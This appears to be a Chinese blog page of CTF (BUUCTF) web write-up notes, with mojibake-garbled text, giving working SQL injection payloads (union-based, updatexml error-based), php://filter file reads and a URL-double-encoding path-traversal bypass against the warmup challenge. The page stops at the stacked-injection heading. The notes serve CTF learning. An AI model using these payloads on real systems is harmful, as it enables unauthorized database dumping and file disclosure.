<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ã€BUUCTFåˆ·é¢˜ã€‘Webè§£é¢˜æ–¹æ³•æ€»ç»“ï¼ˆä¸€) - ITå­¦ä¹ è€…åšå®¢</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ã€BUUCTFåˆ·é¢˜ã€‘Webè§£é¢˜æ–¹æ³•æ€»ç»“ï¼ˆä¸€)" />
<meta property="og:description" content="æ–‡ç« ç›®å½• å‰è¨€ä¿¡æ¯æœé›†SQLç¼ºçœä»£ç å®¡è®¡SQLæ³¨å…¥å¸¸è§„æµç¨‹BUUCTF HardSQLå †å æ³¨å…¥ä½¿ç”¨MD5å‡½æ•°å®ç°sqlæ³¨å…¥ä¾‹é¢˜BUUCTF WEB [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World(SQLç›²æ³¨ï¼ŒPHPï¼‰[GYCTF2020]Blacklist [å †å æ³¨å…¥] Pingå‘½ä»¤nc tornadoæ–‡ä»¶ä¸Šä¼ è§£æ³• [MRCTF]ä½ ä¼ ä½ ğŸå‘¢ HTTPPHPåºåˆ—åŒ–å’Œååºåˆ—åŒ–buu NiZhuanSiWeiBUUCTF [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz SSRF å‰è¨€ è¾¹åˆ·é¢˜è¾¹æ€»ç»“äº›çŸ¥è¯†ç‚¹ï¼Œè¿˜åœ¨æ›´æ–°ï¼Œå†²ï¼ ä¿¡æ¯æœé›† 1.dirsearchä½¿ç”¨
ä¸‹è½½åœ°å€ï¼šhttps://github.com/maurosoria/dirsearch
åˆ‡æ¢åˆ°å®‰è£…ç›®å½•
py dirsearch.py -u ç½‘å€ -e è¯­è¨€ï¼ˆä¸€èˆ¬ç”¨*ï¼‰ -u æŒ‡å®šurl
-e æŒ‡å®šç½‘ç«™è¯­è¨€
SQLç¼ºçœ payloadï¼š*,1
æŸ¥è¯¢è¯­å¥ï¼šselect *,1||flag from Flag
è§£é¢˜æ€è·¯2ï¼š
payload:1;set sql_mode=PIPES_AS_CONCAT;select 1
è§£æï¼š
åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ã€‚
ä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_mode
æ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½ã€‚
ä»£ç å®¡è®¡ 1.ä½¿ç”¨phpä¼ªåè®®è¯»æ–‡ä»¶å†…å®¹ã€‚ä½¿ç”¨filterè¿‡æ»¤å™¨
?file=php://filter/convert.base64-encode/resource=flag.php ä¾‹é¢˜ï¼šBUUCTFweb Secret File
æŠ“åŒ…
phpmyadmin 4.8.1çš„ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶åŒ…å«çš„æ¼æ´(CVE) ç™½åå•éªŒè¯ï¼š" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/bf339627b513cce4c61b117ff2e09ca0/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-03-28T19:50:53+08:00" />
<meta property="article:modified_time" content="2021-03-28T19:50:53+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="ITå­¦ä¹ è€…åšå®¢" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">ITå­¦ä¹ è€…åšå®¢</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ã€BUUCTFåˆ·é¢˜ã€‘Webè§£é¢˜æ–¹æ³•æ€»ç»“ï¼ˆä¸€)</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night-eighties">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>æ–‡ç« ç›®å½•</h4> 
 <ul><li><a href="#_1" rel="nofollow">å‰è¨€</a></li><li><ul><li><a href="#_5" rel="nofollow">ä¿¡æ¯æœé›†</a></li><li><a href="#SQL_14" rel="nofollow">SQLç¼ºçœ</a></li><li><a href="#_30" rel="nofollow">ä»£ç å®¡è®¡</a></li><li><a href="#SQL_112" rel="nofollow">SQLæ³¨å…¥</a></li><li><ul><li><a href="#_113" rel="nofollow">å¸¸è§„æµç¨‹</a></li><li><a href="#BUUCTF_HardSQL_154" rel="nofollow">BUUCTF HardSQL</a></li><li><a href="#_186" rel="nofollow">å †å æ³¨å…¥</a></li><li><a href="#MD5sql_218" rel="nofollow">ä½¿ç”¨MD5å‡½æ•°å®ç°sqlæ³¨å…¥</a></li><li><a href="#_250" rel="nofollow">ä¾‹é¢˜</a></li><li><ul><li><a href="#BUUCTF_WEB_CISCN2019__Day2_Web1Hack_WorldSQLPHP_251" rel="nofollow">BUUCTF WEB [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World(SQLç›²æ³¨ï¼ŒPHPï¼‰</a></li><li><a href="#GYCTF2020Blacklist__356" rel="nofollow">[GYCTF2020]Blacklist [å †å æ³¨å…¥]</a></li></ul> 
   </li></ul> 
   </li><li><a href="#Ping_376" rel="nofollow">Pingå‘½ä»¤</a></li><li><ul><li><ul><li><a href="#nc_428" rel="nofollow">nc</a></li></ul> 
   </li></ul> 
   </li><li><a href="#tornado_432" rel="nofollow">tornado</a></li><li><a href="#_455" rel="nofollow">æ–‡ä»¶ä¸Šä¼ </a></li><li><ul><li><ul><li><a href="#_456" rel="nofollow">è§£æ³•</a></li></ul> 
    </li><li><a href="#MRCTF_477" rel="nofollow">[MRCTF]ä½ ä¼ ä½ ğŸå‘¢</a></li></ul> 
   </li><li><a href="#HTTP_503" rel="nofollow">HTTP</a></li><li><a href="#PHP_508" rel="nofollow">PHP</a></li><li><ul><li><a href="#_509" rel="nofollow">åºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></li><li><a href="#buu_NiZhuanSiWei_528" rel="nofollow">buu NiZhuanSiWei</a></li><li><a href="#BUUCTF__2020_AreUSerialz_586" rel="nofollow">BUUCTF [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</a></li></ul> 
   </li><li><a href="#SSRF_710" rel="nofollow">SSRF</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="_1"></a>å‰è¨€</h2> 
<pre><code>è¾¹åˆ·é¢˜è¾¹æ€»ç»“äº›çŸ¥è¯†ç‚¹ï¼Œè¿˜åœ¨æ›´æ–°ï¼Œå†²ï¼
</code></pre> 
<h3><a id="_5"></a>ä¿¡æ¯æœé›†</h3> 
<p>1.dirsearchä½¿ç”¨<br> ä¸‹è½½åœ°å€ï¼šhttps://github.com/maurosoria/dirsearch<br> åˆ‡æ¢åˆ°å®‰è£…ç›®å½•</p> 
<pre><code class="prism language-javascript">py dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u ç½‘å€ <span class="token operator">-</span>e è¯­è¨€ï¼ˆä¸€èˆ¬ç”¨<span class="token operator">*</span>ï¼‰
</code></pre> 
<p>-u æŒ‡å®šurl<br> -e æŒ‡å®šç½‘ç«™è¯­è¨€</p> 
<h3><a id="SQL_14"></a>SQLç¼ºçœ</h3> 
<p>payloadï¼š*,1</p> 
<p>æŸ¥è¯¢è¯­å¥ï¼šselect *,1||flag from Flag</p> 
<p>è§£é¢˜æ€è·¯2ï¼š<br> payload:1;set sql_mode=PIPES_AS_CONCAT;select 1</p> 
<p>è§£æï¼š</p> 
<p>åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ã€‚<br> ä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_mode<br> æ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½ã€‚</p> 
<h3><a id="_30"></a>ä»£ç å®¡è®¡</h3> 
<p>1.ä½¿ç”¨phpä¼ªåè®®è¯»æ–‡ä»¶å†…å®¹ã€‚ä½¿ç”¨filterè¿‡æ»¤å™¨</p> 
<pre><code class="prism language-java"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span>flag<span class="token punctuation">.</span>php
</code></pre> 
<p>ä¾‹é¢˜ï¼šBUUCTFweb Secret File<br> <img src="https://images2.imgbox.com/3a/f3/unW2wXdj_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> æŠ“åŒ…</p> 
<ol start="2"><li><a href="https://www.cnblogs.com/leixiao-/p/10265150.html" rel="nofollow">phpmyadmin 4.8.1çš„ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶åŒ…å«çš„æ¼æ´(CVE) </a><br> ç™½åå•éªŒè¯ï¼š<br> ä¾‹é¢˜ï¼šBUUCTF web warmup<br> ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</li></ol> 
<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php
    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name">emmm</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> function <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>$page<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            $whitelist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span>$page<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span>$page<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                echo <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span>$page<span class="token punctuation">,</span> $whitelist<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            $_page <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                $page<span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span>$page <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span>$_page<span class="token punctuation">,</span> $whitelist<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            $_page <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span>$page<span class="token punctuation">)</span><span class="token punctuation">;</span>
            $_page <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                $_page<span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span>$_page <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span>$_page<span class="token punctuation">,</span> $whitelist<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            echo <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  ##ä¸èƒ½ä¸ºç©º
        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  ##æ˜¯å­—ç¬¦ä¸²
        <span class="token operator">&amp;&amp;</span> emmm<span class="token operator">:</span><span class="token operator">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  ##ä¸Šé¢checkfileè¿”å›ä¸º<span class="token boolean">true</span>
    <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        include $_REQUEST<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        echo <span class="token string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>åˆ†æ</p> 
<p>checkfile()å‡½æ•°<br> å®šä¹‰äº†ä¸€ä¸ªç™½åå•ï¼šsource.phpå’Œhint.phpï¼Œåˆ¤æ–­ $pageæ˜¯å¦ä¸ºç©ºã€æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ã€‚<br> åˆ¤æ–­ $pageæ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œè‹¥å­˜åœ¨è¿”å›trueï¼›<br> è€ƒè™‘åˆ°pageæœ‰å‚æ•°çš„æƒ…å†µï¼Œ $_pageæ˜¯å–å‡º $pageé—®å·å‰çš„ä¸œè¥¿ï¼Œç„¶åå†åˆ¤æ–­ $_pageæ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œè‹¥å­˜åœ¨åˆ™è¿”å›trueï¼›ä¸¤ä¸ªå‡½æ•°ä¸€ä¸ªmb_substrå’Œmb_strposï¼Œæ€»çš„æ„æ€å°±æ˜¯æˆªå–å˜é‡pageä¸­?å‰é¢çš„å­—ç¬¦ä¸²ï¼Œç„¶åå†è¿›è¡Œç™½åå•æ ¡éªŒã€‚<br> ä¹‹åæ˜¯urläºŒæ¬¡ç¼–ç é—®é¢˜ï¼Œéœ€è¦å°†?è¿›è¡ŒäºŒæ¬¡urlç¼–ç <br> æ‰€ä»¥æ„é€ payloadï¼š</p> 
<pre><code class="prism language-java">file<span class="token operator">=</span>hint<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">253f</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/ffffllllaaaagggg
æˆ–è€…
file<span class="token operator">=</span>hint<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/<span class="token punctuation">.</span><span class="token punctuation">.</span>/ffffllllaaaagggg
</code></pre> 
<pre><code>å› ä¸ºæœåŠ¡å™¨ä¼šè‡ªåŠ¨è§£ä¸€æ¬¡ç ï¼Œæ‰€ä»¥ $pageçš„å€¼ä¸ºhint.php%3f../../../../../../../../ffffllllaaaaggggï¼Œåˆä¸€æ¬¡urlè§£ç åï¼Œ$_pageçš„å€¼ä¸ºhint.php?../../../../../../../../ffffllllaaaagggg,ç„¶åæˆªå–é—®å·å‰é¢çš„hint.phpåˆ¤æ–­åœ¨ç™½åå•é‡Œè¿”å›trueã€‚
</code></pre> 
<h3><a id="SQL_112"></a>SQLæ³¨å…¥</h3> 
<h4><a id="_113"></a>å¸¸è§„æµç¨‹</h4> 
<p>ä½¿ç”¨hackbar<br> 1.åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹</p> 
<pre><code class="prism language-javascript">'or <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> #
</code></pre> 
<p>å¦‚æœæ˜¯æ•´å½¢ï¼Œä»–çš„æŠ¥é”™ä¿¡æ¯åº”ä¸º<br> " â€™ " é‚£æˆ‘ä»¬éœ€è¦é—­åˆï¼Œç”±äºè¿™ä¸ªé¢˜ç›®æ²¡æœ‰è¿‡æ»¤ä»»ä½•sqlæ³¨å…¥çš„å…³é”®å­—ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨ %23ï¼ˆ#ï¼‰æ¥è¿›è¡Œé—­åˆsqlè¯­å¥</p> 
<p>2.çˆ†åˆ—æ•°</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span>' order by <span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>  ä¸€èˆ¬ä¸º<span class="token number">3</span>æ—¶æœ‰å›æ˜¾ï¼Œå­—æ®µæ•°ä¸º<span class="token number">3</span>
</code></pre> 
<p>3.çˆ†åº“</p> 
<pre><code class="prism language-javascipt">?username=1&amp;password=11' union select 1,version(),database()%23
</code></pre> 
<p>4.çˆ†è¡¨å</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">123</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span>' union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p>5.çˆ†è¡¨</p> 
<pre><code class="prism language-java"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>'union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> from l0ve1ysq1 #
æˆ–
<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span> from l0ve1ysq1<span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p>ps:åŠŸèƒ½å‡½æ•°<br> 1.concat_ws()å‡½æ•°<br> åŠŸèƒ½ï¼šä¸€æ¬¡æ€§æŒ‡å®šåˆ†éš”ç¬¦<br> è¯­æ³•ï¼šconcat_ws(separator,str1,str2,â€¦)<br> è¯´æ˜ï¼šç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šåˆ†éš”ç¬¦ åˆ†éš”ç¬¦ä¸èƒ½ä¸ºç©º å¦‚æœä¸ºNULL åˆ™è¿”å›å€¼NULL<br> 2.concat()å‡½æ•°<br> åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²<br> è¯­æ³•ï¼šconcat(str1,str2,â€¦)<br> è¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸² å¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºNULL åˆ™è¿”å›å€¼NULL<br> 3.group_concat( [DISTINCT] è¦è¿æ¥çš„å­—æ®µ [Order BY æ’åºå­—æ®µ ASC/DESC] [Separator â€˜åˆ†éš”ç¬¦â€™] )<br> å³æŒ‰éœ€æ±‚æ‰“å°å†…å®¹</p> 
<h4><a id="BUUCTF_HardSQL_154"></a>BUUCTF HardSQL</h4> 
<p>ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦è¯•å‘ç°å¾ˆå¤šå­—ç¬¦å¦‚and,unionéƒ½è¢«è¿‡æ»¤<br> å› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤ï¼Œç”¨()åˆ†å‰²è¯­å¥è¾¾åˆ°ä»£æ›¿ç©ºæ ¼çš„æ•ˆæœã€‚=è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨likeæ›¿ä»£ã€‚å°è¯•ç”¨<a href="https://blog.csdn.net/qq_37873738/article/details/88042610">updatexmlæŠ¥é”™æ³¨å…¥</a></p> 
<pre><code class="prism language-javascript">check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span>'<span class="token function">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>
</code></pre> 
<ul><li>çˆ†å‡ºåº“å<br> <img src="https://images2.imgbox.com/64/5d/ZSPKqgMl_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>çˆ†è¡¨å</li></ul> 
<pre><code class="prism language-javascipt">check.php?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e),1))%23&amp;password=2
</code></pre> 
<p><img src="https://images2.imgbox.com/0a/ad/HrGhqhbh_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<ul><li>çˆ†åˆ—å</li></ul> 
<pre><code class="prism language-javascipt">check.php?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e),1))%23&amp;password=2
</code></pre> 
<p><img src="https://images2.imgbox.com/0a/60/Oi6TnF2g_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<ul><li>å› ä¸ºupdataxmlé™åˆ¶è¯­å¥ä¸º32ä½ï¼Œè€Œflagé•¿åº¦å¤§äº32ä½ï¼Œæ‰€ä»¥ç”¨leftå’Œrightå‡½æ•°æ‹¼æ¥</li></ul> 
<pre><code class="prism language-java">å‰åŠéƒ¨åˆ† check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span>'<span class="token function">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">left</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>

ååŠéƒ¨åˆ† <span class="token operator">!</span><span class="token punctuation">[</span>check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span>'<span class="token function">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>img<span class="token operator">-</span>blog<span class="token punctuation">.</span>csdnimg<span class="token punctuation">.</span>cn<span class="token operator">/</span><span class="token number">20210405154340430.</span>png<span class="token operator">?</span>x<span class="token operator">-</span>oss<span class="token operator">-</span>process<span class="token operator">=</span>image<span class="token operator">/</span>watermark<span class="token punctuation">,</span>type_ZmFuZ3poZW5naGVpdGk<span class="token punctuation">,</span>shadow_10<span class="token punctuation">,</span>text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1<span class="token punctuation">,</span>size_16<span class="token punctuation">,</span>color_FFFFFF<span class="token punctuation">,</span>t_70<span class="token punctuation">)</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/59/ac/xKlfoQDC_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> <img src="https://images2.imgbox.com/a4/a8/jPKA0JS6_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<p>å‚è€ƒæ–‡ç« ï¼šã€extractvalueæŠ¥é”™æ³¨å…¥ã€‘https://blog.csdn.net/qin9800/article/details/113446035</p> 
<h4><a id="_186"></a>å †å æ³¨å…¥</h4> 
